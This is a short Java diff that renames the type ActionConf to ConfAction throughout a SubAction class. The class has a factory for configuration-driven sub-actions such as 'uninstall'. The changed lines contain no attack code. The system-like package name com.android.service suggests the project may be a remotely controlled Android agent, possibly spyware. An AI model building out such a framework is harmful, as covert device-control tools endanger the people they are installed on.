@@ -12,6 +12,7 @@ import org.json.JSONObject;
 
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 
@@ -24,7 +25,7 @@ public abstract class SubAction implements Runnable {
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
 	/** Parameters. */
-	private final ActionConf subActionParams;
+	private final ConfAction subActionParams;
 
 	/** The want uninstall. */
 	// protected boolean wantUninstall;
@@ -43,7 +44,7 @@ public abstract class SubAction implements Runnable {
 	 * @param jsubaction
 	 *            the params
 	 */
-	public SubAction(final ActionConf jsubaction) {
+	public SubAction(final ConfAction jsubaction) {
 		this.subActionParams = jsubaction;
 		this.status = Status.self();
 
@@ -62,7 +63,7 @@ public abstract class SubAction implements Runnable {
 	 * @throws JSONException
 	 * @throws ConfigurationException 
 	 */
-	public static SubAction factory(String type, final ActionConf params) throws  ConfigurationException {
+	public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
 		if (type.equals("uninstall")) {
 
 			if (Cfg.DEBUG) {
@@ -158,7 +159,7 @@ public abstract class SubAction implements Runnable {
 	 * @param jsubaction
 	 *            byte array from configuration
 	 */
-	protected abstract boolean parse(final ActionConf jsubaction);
+	protected abstract boolean parse(final ConfAction jsubaction);
 
 	/**
 	 * Execute.
